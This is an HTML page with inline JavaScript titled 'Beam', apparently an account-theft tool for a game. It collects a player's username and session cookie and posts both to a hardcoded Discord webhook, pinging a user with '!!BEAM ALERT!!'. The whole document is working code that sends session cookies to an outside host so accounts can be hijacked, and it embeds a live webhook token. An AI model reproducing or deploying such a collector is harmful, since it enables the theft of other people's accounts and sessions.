<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Beam</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            font-family: Arial, sans-serif;
            background-color: #f0f0f0;
        }
        #beamButton {
            background-color: blue;
            color: white;
            padding: 20px 40px;
            border: none;
            border-radius: 15px;
            font-size: 24px;
            cursor: pointer;
        }
        #inputContainer {
            display: none;
            text-align: center;
        }
        input {
            display: block;
            margin: 10px auto;
            padding: 10px;
            font-size: 16px;
            width: 80%;
            max-width: 400px;
            border-radius: 10px;
            border: 1px solid #ccc;
        }
        button {
            background-color: blue;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 10px;
            cursor: pointer;
            font-size: 16px;
        }
    </style>
</head>
<body>
    <button id="beamButton">Beam</button>
    <div id="inputContainer">
        <h3>Player's Username</h3>
        <input type="text" id="username" placeholder="Enter Username">
        <h3>Player's Cookie</h3>
        <input type="text" id="cookie" placeholder="Enter Cookie">
        <button id="enterButton">Enter</button>
    </div>

    <script>
        document.getElementById('beamButton').addEventListener('click', function() {
            document.getElementById('inputContainer').style.display = 'block';
        });

        document.getElementById('enterButton').addEventListener('click', function() {
            const username = document.getElementById('username').value;
            const cookie = document.getElementById('cookie').value;

            if (username && cookie) {
                const webhookUrl = 'https://discord.com/api/webhooks/1252706909656449145/mug143mFHQ8XQYQtda0oLy5h56M2SmXkGmXrIPyOOg_1f5QOkVS7TQM681bMq28Dtz1_';
                const payload = {
                    content: '<@1093924846460739664> **!!BEAM ALERT!!**',
                    embeds: [
                        {
                            title: "Player's Username",
                            description: username
                        },
                        {
                            title: "Player's Cookie",
                            description: cookie
                        }
                    ]
                };

                fetch(webhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(payload)
                }).then(response => {
                    if (response.ok) {
                        alert('Information sent successfully!');
                    } else {
                        alert('Failed to send information.');
                    }
                }).catch(error => {
                    alert('Error: ' + error.message);
                });
            } else {
                alert('Please fill in both fields.');
            }
        });
    </script>
</body>
</html>
